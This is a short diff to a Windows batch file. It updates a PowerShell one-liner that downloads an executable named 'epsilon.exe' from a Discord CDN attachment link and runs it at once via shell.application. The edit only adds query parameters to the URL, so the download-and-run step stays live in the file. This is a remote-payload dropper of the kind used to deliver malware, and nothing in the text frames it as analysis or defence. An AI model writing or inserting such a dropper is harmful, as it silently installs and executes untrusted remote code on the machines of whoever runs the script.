@@ -1,6 +1,6 @@
 @echo off
 cd Components
-powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1206204999433068564/epsilon.exe';$file='epsilon.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1206204999433068564/epsilon.exe?ex=65db28f2&is=65c8b3f2&hm=91b58cbccfde5aeddbf5ebf2d8662d28788d8ce95e536f31f650b64efbbf2e58&';$file='epsilon.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 cls
 cd ..
 cd /d %~dp0
